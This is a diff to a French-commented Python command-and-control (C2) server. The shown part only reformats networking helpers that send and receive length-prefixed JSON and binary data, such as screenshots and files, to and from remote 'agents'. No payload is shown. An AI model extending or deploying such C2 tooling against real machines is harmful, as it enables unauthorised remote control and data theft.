@@ -1,30 +1,35 @@
-#Code serveur C2
-import socket
-import json
-import struct
-import threading
-import os
-from datetime import datetime
+# Code du serveur C2
 
-ENCODING = "utf-8"
-HOST = "0.0.0.0"
-PORT = 8080
+import socket       
+import json        
+import struct      
+import threading   
+import os           
+from datetime import datetime  
 
-#Fonctions réseau
+#constantes
+ENCODING = "utf-8"  
+HOST = "0.0.0.0"    
+PORT = 8080          
 
-def send_msg(sock: socket.socket, payload: dict) -> None:
-    """Pour envoyer un json"""
+# Fonctions réseau
+
+#message json au client
+def send_msg(sock, payload):        
+    #convertit le dictionnaire python en json puis en octets
     data = json.dumps(payload).encode(ENCODING)
+    # 4 premiers octets = taille du message
     sock.sendall(struct.pack(">I", len(data)) + data)
 
-def send_bytes(sock: socket.socket, blob: bytes, meta: dict) -> None:
-    """Pour envoyer des bytes (screenshot, fichier…)"""
+#envoie d'un binaire
+def send_bytes(sock, blob, meta):
+    #metadonnées en json
     header = json.dumps(meta).encode(ENCODING)
     sock.sendall(struct.pack(">I", len(header)) + header)
+    #ensuite binaires brutes
     sock.sendall(struct.pack(">I", len(blob)) + blob)
 
-def _receiveN(sock: socket.socket, n: int) -> bytes | None:
-    """Lit exactement n octets"""
+def _receiveN(sock, n):
     buf = b""
     while len(buf) < n:
         chunk = sock.recv(n - len(buf))
@@ -33,8 +38,7 @@ def _receiveN(sock: socket.socket, n: int) -> bytes | None:
         buf += chunk
     return buf
 
-def receiveMessage(sock: socket.socket) -> dict:
-    """Pour recevoir un json"""
+def receiveMessage(sock):
     raw_len = _receiveN(sock, 4)
     if raw_len is None:
         raise ConnectionError("connexion coupée par le client")
@@ -44,8 +48,7 @@ def receiveMessage(sock: socket.socket) -> dict:
         raise ConnectionError("connexion interrompue en cours de message")
     return json.loads(data.decode(ENCODING))
 
-def receiveBytes(sock: socket.socket) -> bytes:
-    """Pour recevoir des bytes bruts genre screenshot"""
+def receiveBytes(sock):
     raw_len = _receiveN(sock, 4)
     if raw_len is None:
         raise ConnectionError("connexion coupée")
@@ -117,7 +120,6 @@ def handle_new_agent(sock, addr):
 #Envoyer et recevoir les reponses des agents
 
 def recv_response(agent):
-    """Recoit la reponse json d'un agent"""
     try:
         return receiveMessage(agent.sock)
     except ConnectionError:
